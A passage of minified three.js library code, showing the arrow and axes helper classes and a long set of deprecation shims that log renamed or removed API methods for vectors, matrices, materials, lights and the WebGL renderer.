t=this.box;t.isEmpty()||(t.getCenter(this.position),t.getSize(this.scale),this.scale.multiplyScalar(.5),K.prototype.updateMatrixWorld.call(this,e))},Rl.prototype=Object.create(Wr.prototype),Rl.prototype.constructor=Rl,Rl.prototype.updateMatrixWorld=function(e){var t=-this.plane.constant;Math.abs(t)<1e-8&&(t=1e-8),this.scale.set(.5*this.size,.5*this.size,t),this.children[0].material.side=t<0?1:0,this.lookAt(this.plane.normal),K.prototype.updateMatrixWorld.call(this,e)};var kl,Ol,Il=new y;function Bl(e,t,i,n,r,o){K.call(this),void 0===e&&(e=new y(0,0,1)),void 0===t&&(t=new y(0,0,0)),void 0===i&&(i=1),void 0===n&&(n=16776960),void 0===r&&(r=.2*i),void 0===o&&(o=.2*r),void 0===kl&&((kl=new dt).addAttribute("position",new tt([0,0,0,0,1,0],3)),(Ol=new ma(0,.5,1,5,1)).translate(0,-.5,0)),this.position.copy(t),this.line=new Wr(kl,new Nr({color:n})),this.line.matrixAutoUpdate=!1,this.add(this.line),this.cone=new Lt(Ol,new qe({color:n})),this.cone.matrixAutoUpdate=!1,this.add(this.cone),this.setDirection(e),this.setLength(i,r,o)}function Dl(e){var t=[0,0,0,e=e||1,0,0,0,0,0,0,e,0,0,0,0,0,0,e],i=new dt;i.addAttribute("position",new tt(t,3)),i.addAttribute("color",new tt([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1],3));var n=new Nr({vertexColors:2});Yr.call(this,i,n)}Bl.prototype=Object.create(K.prototype),Bl.prototype.constructor=Bl,Bl.prototype.setDirection=function(e){if(e.y>.99999)this.quaternion.set(0,0,0,1);else if(e.y<-.99999)this.quaternion.set(1,0,0,0);else{Il.set(e.z,0,-e.x).normalize();var t=Math.acos(e.y);this.quaternion.setFromAxisAngle(Il,t)}},Bl.prototype.setLength=function(e,t,i){void 0===t&&(t=.2*e),void 0===i&&(i=.2*t),this.line.scale.set(1,Math.max(1e-4,e-t),1),this.line.updateMatrix(),this.cone.scale.set(i,t,i),this.cone.position.y=e,this.cone.updateMatrix()},Bl.prototype.setColor=function(e){this.line.material.color.set(e),this.cone.material.color.set(e)},Bl.prototype.copy=function(e){return K.prototype.copy.call(this,e,!1),this.line.copy(e.line),this.cone.copy(e.cone),this},Bl.prototype.clone=function(){return(new this.constructor).copy(this)},Dl.prototype=Object.create(Yr.prototype),Dl.prototype.constructor=Dl;function zl(e){console.warn("THREE.Spline has been removed. Use THREE.CatmullRomCurve3 instead."),ps.call(this,e),this.type="catmullrom"}os.create=function(e,t){return console.log("THREE.Curve.create() has been deprecated"),e.prototype=Object.create(os.prototype),e.prototype.constructor=e,e.prototype.getPoint=t,e},Object.assign(Ts.prototype,{createPointsGeometry:function(e){console.warn("THREE.CurvePath: .createPointsGeometry() has been removed. Use new THREE.Geometry().setFromPoints( points ) instead.");var t=this.getPoints(e);return this.createGeometry(t)},createSpacedPointsGeometry:function(e){console.warn("THREE.CurvePath: .createSpacedPointsGeometry() has been removed. Use new THREE.Geometry().setFromPoints( points ) instead.");var t=this.getSpacedPoints(e);return this.createGeometry(t)},createGeometry:function(e){console.warn("THREE.CurvePath: .createGeometry() has been removed. Use new THREE.Geometry().setFromPoints( points ) instead.");for(var t=new zt,i=0,n=e.length;i<n;i++){var r=e[i];t.vertices.push(new y(r.x,r.y,r.z||0))}return t}}),Object.assign(Es.prototype,{fromPoints:function(e){console.warn("THREE.Path: .fromPoints() has been renamed to .setFromPoints()."),this.setFromPoints(e)}}),Object.create(ps.prototype),Object.create(ps.prototype),zl.prototype=Object.create(ps.prototype),Object.assign(zl.prototype,{initFromArray:function(){console.error("THREE.Spline: .initFromArray() has been removed.")},getControlPointsArray:function(){console.error("THREE.Spline: .getControlPointsArray() has been removed.")},reparametrizeByArcLength:function(){console.error("THREE.Spline: .reparametrizeByArcLength() has been removed.")}}),pl.prototype.setColors=function(){console.error("THREE.GridHelper: setColors() has been deprecated, pass them in the constructor instead.")},ol.prototype.update=function(){console.error("THREE.SkeletonHelper: update() no longer needs to be called.")},Object.assign(Qa.prototype,{extractUrlBase:function(e){return console.warn("THREE.Loader: .extractUrlBase() has been deprecated. Use THREE.LoaderUtils.extractUrlBase() instead."),Vs(e)}}),Qa.Handlers={add:function(){console.error("THREE.Loader: Handlers.add() has been removed. Use LoadingManager.addHandler() instead.")},get:function(){console.error("THREE.Loader: Handlers.get() has been removed. Use LoadingManager.getHandler() instead.")}},Object.assign(Xs.prototype,{setTexturePath:function(e){return console.warn("THREE.ObjectLoader: .setTexturePath() has been renamed to .setResourcePath()."),this.setResourcePath(e)}}),Object.assign(Gc.prototype,{center:function(e){return console.warn("THREE.Box2: .center() has been renamed to .getCenter()."),this.getCenter(e)},empty:function(){return console.warn("THREE.Box2: .empty() has been renamed to .isEmpty()."),this.isEmpty()},isIntersectionBox:function(e){return console.warn("THREE.Box2: .isIntersectionBox() has been renamed to .intersectsBox()."),this.intersectsBox(e)},size:function(e){return console.warn("THREE.Box2: .size() has been renamed to .getSize()."),this.getSize(e)}}),Object.assign(pe.prototype,{center:function(e){return console.warn("THREE.Box3: .center() has been renamed to .getCenter()."),this.getCenter(e)},empty:function(){return console.warn("THREE.Box3: .empty() has been renamed to .isEmpty()."),this.isEmpty()},isIntersectionBox:function(e){return console.warn("THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox()."),this.intersectsBox(e)},isIntersectionSphere:function(e){return console.warn("THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere()."),this.intersectsSphere(e)},size:function(e){return console.warn("THREE.Box3: .size() has been renamed to .getSize()."),this.getSize(e)}}),Xc.prototype.center=function(e){return console.warn("THREE.Line3: .center() has been renamed to .getCenter()."),this.getCenter(e)},Object.assign(p,{random16:function(){return console.warn("THREE.Math: .random16() has been deprecated. Use Math.random() instead."),Math.random()},nearestPowerOfTwo:function(e){return console.warn("THREE.Math: .nearestPowerOfTwo() has been renamed to .floorPowerOfTwo()."),p.floorPowerOfTwo(e)},nextPowerOfTwo:function(e){return console.warn("THREE.Math: .nextPowerOfTwo() has been renamed to .ceilPowerOfTwo()."),p.ceilPowerOfTwo(e)}}),Object.assign(x.prototype,{flattenToArrayOffset:function(e,t){return console.warn("THREE.Matrix3: .flattenToArrayOffset() has been deprecated. Use .toArray() instead."),this.toArray(e,t)},multiplyVector3:function(e){return console.warn("THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead."),e.applyMatrix3(this)},multiplyVector3Array:function(){console.error("THREE.Matrix3: .multiplyVector3Array() has been removed.")},applyToBuffer:function(e){return console.warn("THREE.Matrix3: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead."),this.applyToBufferAttribute(e)},applyToVector3Array:function(){console.error("THREE.Matrix3: .applyToVector3Array() has been removed.")}}),Object.assign(B.prototype,{extractPosition:function(e){return console.warn("THREE.Matrix4: .extractPosition() has been renamed to .copyPosition()."),this.copyPosition(e)},flattenToArrayOffset:function(e,t){return console.warn("THREE.Matrix4: .flattenToArrayOffset() has been deprecated. Use .toArray() instead."),this.toArray(e,t)},getPosition:function(){return console.warn("THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead."),(new y).setFromMatrixColumn(this,3)},setRotationFromQuaternion:function(e){return console.warn("THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion()."),this.makeRotationFromQuaternion(e)},multiplyToArray:function(){console.warn("THREE.Matrix4: .multiplyToArray() has been removed.")},multiplyVector3:function(e){return console.warn("THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) instead."),e.applyMatrix4(this)},multiplyVector4:function(e){return console.warn("THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead."),e.applyMatrix4(this)},multiplyVector3Array:function(){console.error("THREE.Matrix4: .multiplyVector3Array() has been removed.")},rotateAxis:function(e){console.warn("THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead."),e.transformDirection(this)},crossVector:function(e){return console.warn("THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead."),e.applyMatrix4(this)},translate:function(){console.error("THREE.Matrix4: .translate() has been removed.")},rotateX:function(){console.error("THREE.Matrix4: .rotateX() has been removed.")},rotateY:function(){console.error("THREE.Matrix4: .rotateY() has been removed.")},rotateZ:function(){console.error("THREE.Matrix4: .rotateZ() has been removed.")},rotateByAxis:function(){console.error("THREE.Matrix4: .rotateByAxis() has been removed.")},applyToBuffer:function(e){return console.warn("THREE.Matrix4: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead."),this.applyToBufferAttribute(e)},applyToVector3Array:function(){console.error("THREE.Matrix4: .applyToVector3Array() has been removed.")},makeFrustum:function(e,t,i,n,r,o){return console.warn("THREE.Matrix4: .makeFrustum() has been removed. Use .makePerspective( left, right, top, bottom, near, far ) instead."),this.makePerspective(e,t,n,i,r,o)}}),$t.prototype.isIntersectionLine=function(e){return console.warn("THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine()."),this.intersectsLine(e)},m.prototype.multiplyVector3=function(e){return console.warn("THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead."),e.applyQuaternion(this)},Object.assign(Se.prototype,{isIntersectionBox:function(e){return console.warn("THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox()."),this.intersectsBox(e)},isIntersectionPlane:function(e){return console.warn("THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane()."),this.intersectsPlane(e)},isIntersectionSphere:function(e){return console.warn("THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere()."),this.intersectsSphere(e)}}),Object.assign(Be.prototype,{area:function(){return console.warn("THREE.Triangle: .area() has been renamed to .getArea()."),this.getArea()},barycoordFromPoint:function(e,t){return console.warn("THREE.Triangle: .barycoordFromPoint() has been renamed to .getBarycoord()."),this.getBarycoord(e,t)},midpoint:function(e){return console.warn("THREE.Triangle: .midpoint() has been renamed to .getMidpoint()."),this.getMidpoint(e)},normal:function(e){return console.warn("THREE.Triangle: .normal() has been renamed to .getNormal()."),this.getNormal(e)},plane:function(e){return console.warn("THREE.Triangle: .plane() has been renamed to .getPlane()."),this.getPlane(e)}}),Object.assign(Be,{barycoordFromPoint:function(e,t,i,n,r){return console.warn("THREE.Triangle: .barycoordFromPoint() has been renamed to .getBarycoord()."),Be.getBarycoord(e,t,i,n,r)},normal:function(e,t,i,n){return console.warn("THREE.Triangle: .normal() has been renamed to .getNormal()."),Be.getNormal(e,t,i,n)}}),Object.assign(As.prototype,{extractAllPoints:function(e){return console.warn("THREE.Shape: .extractAllPoints() has been removed. Use .extractPoints() instead."),this.extractPoints(e)},extrude:function(e){return console.warn("THREE.Shape: .extrude() has been removed. Use ExtrudeGeometry() instead."),new Jo(this,e)},makeGeometry:function(e){return console.warn("THREE.Shape: .makeGeometry() has been removed. Use ShapeGeometry() instead."),new ha(this,e)}}),Object.assign(f.prototype,{fromAttribute:function(e,t,i){return console.warn("THREE.Vector2: .fromAttribute() has been renamed to .fromBufferAttribute()."),this.fromBufferAttribute(e,t,i)},distanceToManhattan:function(e){return console.warn("THREE.Vector2: .distanceToManhattan() has been renamed to .manhattanDistanceTo()."),this.manhattanDistanceTo(e)},lengthManhattan:function(){return console.warn("THREE.Vector2: .lengthManhattan() has been renamed to .manhattanLength()."),this.manhattanLength()}}),Object.assign(y.prototype,{setEulerFromRotationMatrix:function(){console.error("THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.")},setEulerFromQuaternion:function(){console.error("THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.")},getPositionFromMatrix:function(e){return console.warn("THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition()."),this.setFromMatrixPosition(e)},getScaleFromMatrix:function(e){return console.warn("THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale()."),this.setFromMatrixScale(e)},getColumnFromMatrix:function(e,t){return console.warn("THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn()."),this.setFromMatrixColumn(t,e)},applyProjection:function(e){return console.warn("THREE.Vector3: .applyProjection() has been removed. Use .applyMatrix4( m ) instead."),this.applyMatrix4(e)},fromAttribute:function(e,t,i){return console.warn("THREE.Vector3: .fromAttribute() has been renamed to .fromBufferAttribute()."),this.fromBufferAttribute(e,t,i)},distanceToManhattan:function(e){return console.warn("THREE.Vector3: .distanceToManhattan() has been renamed to .manhattanDistanceTo()."),this.manhattanDistanceTo(e)},lengthManhattan:function(){return console.warn("THREE.Vector3: .lengthManhattan() has been renamed to .manhattanLength()."),this.manhattanLength()}}),Object.assign(T.prototype,{fromAttribute:function(e,t,i){return console.warn("THREE.Vector4: .fromAttribute() has been renamed to .fromBufferAttribute()."),this.fromBufferAttribute(e,t,i)},lengthManhattan:function(){return console.warn("THREE.Vector4: .lengthManhattan() has been renamed to .manhattanLength()."),this.manhattanLength()}}),Object.assign(zt.prototype,{computeTangents:function(){console.error("THREE.Geometry: .computeTangents() has been removed.")},computeLineDistances:function(){console.error("THREE.Geometry: .computeLineDistances() has been removed. Use THREE.Line.computeLineDistances() instead.")}}),Object.assign(K.prototype,{getChildByName:function(e){return console.warn("THREE.Object3D: .getChildByName() has been renamed to .getObjectByName()."),this.getObjectByName(e)},renderDepth:function(){console.warn("THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.")},translate:function(e,t){return console.warn("THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead."),this.translateOnAxis(t,e)},getWorldRotation:function(){console.error("THREE.Object3D: .getWorldRotation() has been removed. Use THREE.Object3D.getWorldQuaternion( target ) instead.")}}),Object.defineProperties(K.prototype,{eulerOrder:{get:function(){return console.warn("THREE.Object3D: .eulerOrder is now .rotation.order."),this.rotation.order},set:function(e){console.warn("THREE.Object3D: .eulerOrder is now .rotation.order."),this.rotation.order=e}},useQuaternion:{get:function(){console.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.")},set:function(){console.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.")}}}),Object.defineProperties(kr.prototype,{objects:{get:function(){return console.warn("THREE.LOD: .objects has been renamed to .levels."),this.levels}}}),Object.defineProperty(Dr.prototype,"useVertexTexture",{get:function(){console.warn("THREE.Skeleton: useVertexTexture has been removed.")},set:function(){console.warn("THREE.Skeleton: useVertexTexture has been removed.")}}),Or.prototype.initBones=function(){console.error("THREE.SkinnedMesh: initBones() has been removed.")},Object.defineProperty(os.prototype,"__arcLengthDivisions",{get:function(){return console.warn("THREE.Curve: .__arcLengthDivisions is now .arcLengthDivisions."),this.arcLengthDivisions},set:function(e){console.warn("THREE.Curve: .__arcLengthDivisions is now .arcLengthDivisions."),this.arcLengthDivisions=e}}),Gt.prototype.setLens=function(e,t){console.warn("THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup."),void 0!==t&&(this.filmGauge=t),this.setFocalLength(e)},Object.defineProperties(Cs.prototype,{onlyShadow:{set:function(){console.warn("THREE.Light: .onlyShadow has been removed.")}},shadowCameraFov:{set:function(e){console.warn("THREE.Light: .shadowCameraFov is now .shadow.camera.fov."),this.shadow.camera.fov=e}},shadowCameraLeft:{set:function(e){console.warn("THREE.Light: .shadowCameraLeft is now .shadow.camera.left."),this.shadow.camera.left=e}},shadowCameraRight:{set:function(e){console.warn("THREE.Light: .shadowCameraRight is now .shadow.camera.right."),this.shadow.camera.right=e}},shadowCameraTop:{set:function(e){console.warn("THREE.Light: .shadowCameraTop is now .shadow.camera.top."),this.shadow.camera.top=e}},shadowCameraBottom:{set:function(e){console.warn("THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom."),this.shadow.camera.bottom=e}},shadowCameraNear:{set:function(e){console.warn("THREE.Light: .shadowCameraNear is now .shadow.camera.near."),this.shadow.camera.near=e}},shadowCameraFar:{set:function(e){console.warn("THREE.Light: .shadowCameraFar is now .shadow.camera.far."),this.shadow.camera.far=e}},shadowCameraVisible:{set:function(){console.warn("THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.")}},shadowBias:{set:function(e){console.warn("THREE.Light: .shadowBias is now .shadow.bias."),this.shadow.bias=e}},shadowDarkness:{set:function(){console.warn("THREE.Light: .shadowDarkness has been removed.")}},shadowMapWidth:{set:function(e){console.warn("THREE.Light: .shadowMapWidth is now .shadow.mapSize.width."),this.shadow.mapSize.width=e}},shadowMapHeight:{set:function(e){console.warn("THREE.Light: .shadowMapHeight is now .shadow.mapSize.height."),this.shadow.mapSize.height=e}}}),Object.defineProperties(Xe.prototype,{length:{get:function(){return console.warn("THREE.BufferAttribute: .length has been deprecated. Use .count instead."),this.array.length}},dynamic:{get:function(){return console.warn("THREE.BufferAttribute: .dynamic has been deprecated. Use .usage instead."),35048===this.usage},set:function(){console.warn("THREE.BufferAttribute: .dynamic has been deprecated. Use .usage instead."),this.setUsage(35048)}}}),Object.assign(Xe.prototype,{setDynamic:function(e){return console.warn("THREE.BufferAttribute: .setDynamic() has been deprecated. Use .setUsage() instead."),this.setUsage(!0===e?35048:35044),this},copyIndicesArray:function(){console.error("THREE.BufferAttribute: .copyIndicesArray() has been removed.")},setArray:function(){console.error("THREE.BufferAttribute: .setArray has been removed. Use BufferGeometry .setAttribute to replace/resize attribute buffers")}}),Object.assign(dt.prototype,{addIndex:function(e){console.warn("THREE.BufferGeometry: .addIndex() has been renamed to .setIndex()."),this.setIndex(e)},addDrawCall:function(e,t,i){void 0!==i&&console.warn("THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset."),console.warn("THREE.BufferGeometry: .addDrawCall() is now .addGroup()."),this.addGroup(e,t)},clearDrawCalls:function(){console.warn("THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups()."),this.clearGroups()},computeTangents:function(){console.warn("THREE.BufferGeometry: .computeTangents() has been removed.")},computeOffsets:function(){console.warn("THREE.BufferGeometry: .computeOffsets() has been removed.")}}),Object.defineProperties(dt.prototype,{drawcalls:{get:function(){return console.error("THREE.BufferGeometry: .drawcalls has been renamed to .groups."),this.groups}},offsets:{get:function(){return console.warn("THREE.BufferGeometry: .offsets has been renamed to .groups."),this.groups}}}),Object.defineProperties(pr.prototype,{dynamic:{get:function(){return console.warn("THREE.InterleavedBuffer: .length has been deprecated. Use .usage instead."),35048===this.usage},set:function(e){console.warn("THREE.InterleavedBuffer: .length has been deprecated. Use .usage instead."),this.setUsage(e)}}}),Object.assign(pr.prototype,{setDynamic:function(e){return console.warn("THREE.InterleavedBuffer: .setDynamic() has been deprecated. Use .setUsage() instead."),this.setUsage(!0===e?35048:35044),this},setArray:function(){console.error("THREE.InterleavedBuffer: .setArray has been removed. Use BufferGeometry .setAttribute to replace/resize attribute buffers")}}),Object.assign(Ko.prototype,{getArrays:function(){console.error("THREE.ExtrudeBufferGeometry: .getArrays() has been removed.")},addShapeList:function(){console.error("THREE.ExtrudeBufferGeometry: .addShapeList() has been removed.")},addShape:function(){console.error("THREE.ExtrudeBufferGeometry: .addShape() has been removed.")}}),Object.defineProperties(zc.prototype,{dynamic:{set:function(){console.warn("THREE.Uniform: .dynamic has been removed. Use object.onBeforeRender() instead.")}},onUpdate:{value:function(){return console.warn("THREE.Uniform: .onUpdate() has been removed. Use object.onBeforeRender() instead."),this}}}),Object.defineProperties(We.prototype,{wrapAround:{get:function(){console.warn("THREE.Material: .wrapAround has been removed.")},set:function(){console.warn("THREE.Material: .wrapAround has been removed.")}},overdraw:{get:function(){console.warn("THREE.Material: .overdraw has been removed.")},set:function(){console.warn("THREE.Material: .overdraw has been removed.")}},wrapRGB:{get:function(){return console.warn("THREE.Material: .wrapRGB has been removed."),new Ne}},shading:{get:function(){console.error("THREE."+this.type+": .shading has been removed. Use the boolean .flatShading instead.")},set:function(e){console.warn("THREE."+this.type+": .shading has been removed. Use the boolean .flatShading instead."),this.flatShading=1===e}},stencilMask:{get:function(){return console.warn("THREE."+this.type+": .stencilMask has been removed. Use .stencilFuncMask instead."),this.stencilFuncMask},set:function(e){console.warn("THREE."+this.type+": .stencilMask has been removed. Use .stencilFuncMask instead."),this.stencilFuncMask=e}}}),Object.defineProperties(Ta.prototype,{metal:{get:function(){return console.warn("THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead."),!1},set:function(){console.warn("THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead")}}}),Object.defineProperties(Vt.prototype,{derivatives:{get:function(){return console.warn("THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives."),this.extensions.derivatives},set:function(e){console.warn("THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives."),this.extensions.derivatives=e}}}),Object.assign(hr.prototype,{clearTarget:function(e,t,i,n){console.warn("THREE.WebGLRenderer: .clearTarget() has been deprecated. Use .setRenderTarget() and .clear() instead."),this.setRenderTarget(e),this.clear(t,i,n)},animate:function(e){console.warn("THREE.WebGLRenderer: .animate() is now .setAnimationLoop()."),this.setAnimationLoop(e)},getCurrentRenderTarget:function(){return console.warn("THREE.WebGLRenderer: .getCurrentRenderTarget() is now .getRenderTarget()."),this.getRenderTarget()},getMaxAnisotropy:function(){return console.warn("THREE.WebGLRenderer: .getMaxAnisotropy() is now .capabilities.getMaxAnisotropy()."),this.capabilities.getMaxAnisotropy()},getPrecision:function(){return console.warn("THREE.WebGLRenderer: .getPrecision() is now .capabilities.precision."),this.capabilities.precision},resetGLState:function(){return console.warn("THREE.WebGLRenderer: .resetGLState() is now .state.reset()."),this.state.reset()},supportsFloatTextures:function(){return console.warn("THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' )."),this.extensions.get("OES_texture_float")},supportsHalfFloatTextures:function(){return console.warn("THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' )."),this.extensions.get("OES_texture_half_float")},supportsStandardDerivatives:function(){return console.warn("THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' )."),this.extensions.get("OES_standard_derivatives")},supportsCompressedTextureS3TC:function(){return console.warn("THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' )."),this.extensions.get("WEBGL_compressed_texture_s3tc")},supportsCompressedTexturePVRTC:function(){return console.warn("THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' )."),this.extensions.get("WEBGL_compressed_texture_pvrtc")},supportsBlendMinMax:function(){return console.warn("THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' )."),this.extensions.get("EXT_blend_minmax")},supportsVertexTextures:function(){return console.warn("THREE.WebGLRenderer: .supportsVertexTextures() is now .capabilities.vertexTextures."),this.capabilities.vertexTextures},supportsInstancedArrays:function(){return console.warn("THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' )."),this.extensions.get("ANGLE_instanced_arrays")},enableScissorTest:function(e){console.warn("THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest()."),this.setScissorTest(e)},initMaterial:function(){console.warn("THREE.WebGLRenderer: .initMaterial() has been removed.")},addPrePlugin:function(){console.warn("THREE.WebGLRenderer: .addPrePlugin() has been removed.")},addPostPlugin:function(){console.warn("THREE.WebGLRenderer: .addPostPlugin() has been removed.")},updateShadowMap:function(){console.warn("THREE.WebGLRenderer: .updateShadowMap() has been removed.")},setFaceCulling:function(){console.warn("THREE.WebGLRenderer: .setFaceCulling() has been removed.")},allocTextureUnit:function(){console.warn("THREE.WebGLRenderer: .allocTextureUnit() has been removed.")},setTexture:function(){console.warn("THREE.WebGLRenderer: .setTexture() has been removed.")},setTexture2D:function(){console.warn("THREE.WebGLRenderer: .setTexture2D() has been removed.")},setTextureCube:function(){console.warn("THREE.WebGLRenderer: .setTextureCube() has been removed.")},getActiveMipMapLevel:function(){return console.warn("THREE.WebGLRenderer: .getActiveMipMapLevel() is now .getActiveMipmapLevel()."),this.getActiveMipmapLevel()}}),Object.defineProperties(hr.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(e){console.warn("THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled."),this.shadowMap.enabled=e}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(e){console.warn("THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type."),this.shadowMap.type=e}},shadowMapCullFace:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMapCullFace has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMapCullFace has been removed. Set Material.shadowSide instead.")}},context:{get:function(){return console.warn("THREE.WebGLRenderer: .context has been removed. Use .getContext() instead."),this.getContext()}}}),Object.defineProperties(Qn.prototype,{cullFace:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMap.cullFace has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMap.cullFace has been removed. Set Material.shadowSide instead.")}},renderReverseSided:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderReverseSided has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderReverseSided has been removed. Set Material.shadowSide instead.")}},renderSingleSided:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderSingleSided has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderSingleSided has been removed. Set Material.shadowSide instead.")}}}),Object.defineProperties(qt.prototype,{activeCubeFace:{set:function(){console.warn("THREE.WebGLRenderTargetCube: .activeCubeFace has been removed. It is now the second parameter of WebGLRenderer.setRenderTarget().")}},activeMipMapLevel:{set:function(){console.warn("THREE.WebGLRenderTargetCube: .activeMipMapLevel has been removed. It is now the third parameter of WebGLRenderer.setRenderTarget().")}}}),Object.defineProperties(E.prototype,{wrapS:{get:function(){return console.warn("THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS."),this.texture.wrapS},set:function(e){console.warn("THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS."),this.texture.wrapS=e}},wrapT:{get:function(){return console.warn("THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT."),this.texture.wrapT},set:function(e){console.warn("THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT."),this.texture.wrapT=e}},magFilter:{get:function(){return console.warn("THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter."),this.texture.magFilter},set:function(e){console.warn("THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter."),this.texture.magFilter=e}},minFilter:{get:function(){return console.warn("THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter."),this.texture.minFilter},set:function(e){console.warn("THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter."),this.texture.minFilter=e}},anisotropy:{get:function(){return console.warn("THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy."),this.texture.anisotropy},set:function(e){console.warn("THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy."),this.texture.anisotropy=e}},offset:{get:function(){return console.warn("THREE.WebGLRenderTarget: .offset is now .texture.offset."),this.texture.offset},set:function(e){console.warn("THREE.WebGLRenderTarget: .offset is now .texture.offset."),this.texture.offset=e}},repeat:{get:function(){return console.warn("THREE.WebGLRenderTarget: .repeat is now .texture.repeat."),this.texture.repeat},set:function(e){console.warn("THREE.WebGLRenderTarget: .repeat is now .texture.repeat."),this.texture.repeat=e}},format:{get:function(){return console.warn("THREE.WebGLRenderTarget: .format is now .texture.format."),this.texture.format},set:function(e){console.warn("THREE.WebGLRenderTarget: .format is now .texture.format."),this.texture.format=e}},type:{get:function(){return console.warn("THREE.WebGLRenderTarget: .type is now .texture.type."),this.texture.type},set:function(e){console.warn("THREE.WebGLRenderTarget: .type is now .texture.type."),this.texture.type=e}},generateMipmaps:{get:function(){return console.warn("THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps."),this.texture.generateMipmaps},set:function(e){console.warn("THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps."),this.texture.generateMipmaps=e}}}),Object.defineProperties(cr.prototype,{standing:{set:function(){console.warn("THREE.WebVRManager: .standing has been removed.")}},userHeight:{set:function(){console.warn("THREE.WebVRManager: .userHeight has been removed.")}}}),gc.prototype.load=function(e){console.warn("THREE.Audio: .load has been deprecated. Use THREE.AudioLoader instead.");var t=this;return(new rc).load(e,(function(e){t.setBuffer(e)})),this},Mc.prototype.getData=function(){return console.warn("THREE.AudioAnalyser: .getData() is now .getFrequencyData()."),this.getFrequencyData()},Wt.prototype.updateCubeMap=function(e,t){return console.warn("THREE.CubeCamera: .updateCubeMap() is now .update()."),this.update(e,t)};_.crossOrigin=void 0,_.loadTexture=function(e,t,i,n){console.warn("THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.");var r=new rs;r.setCrossOrigin(this.crossOrigin);var o=r.load(e,i,void 0,n);return t&&(o.mapping=t),o},_.loadTextureCube=function(e,t,i,n){console.warn("THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.");var r=new ns;r.setCrossOrigin(this.crossOrigin);var o=r.load(e,i,void 0,n);return t&&(o.mapping=t),o},_.loadCompressedTexture=function(){console.error("THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader 